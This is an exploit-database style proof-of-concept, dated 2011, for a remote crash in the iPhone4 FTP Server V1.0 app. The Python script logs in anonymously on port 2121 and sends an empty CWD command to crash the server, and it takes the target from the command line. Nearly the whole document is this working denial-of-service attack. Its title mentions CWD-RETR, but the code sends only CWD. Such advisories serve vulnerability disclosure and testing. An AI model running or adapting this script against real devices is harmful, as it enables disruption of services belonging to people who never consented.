# Exploit Title: iPhone4 FTP Server V1.0 - Empty CWD-RETR Remote Crash
# Date: 2011-05-30
# Author: offsetIntruder
# Software Link: http://itunes.apple.com/us/app/ftp-server/id356055128?mt=8
# Version: 1.0
# Tested on: iPhone4 IOS 4.3.2
# CVE: N/A
  
import socket
import sys
  
user="anonymous"
 
  
print("\n iPhone4 FTP Server By Zhang Boyang - Empty CWD-RETR Remote Crash\n")
 
 
def ExploitFTP(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,2121))
    data = s.recv(1024)
    print("[+] Sending user login...")
    s.send("USER " + user + '\r\n')
    data = s.recv(1024)
    print("[+] Sending empty CWD...\n")
    s.send("CWD \r\n")
    data = s.recv(1024)
    s.close()
     
target = sys.argv[1]
  
ExploitFTP(target)
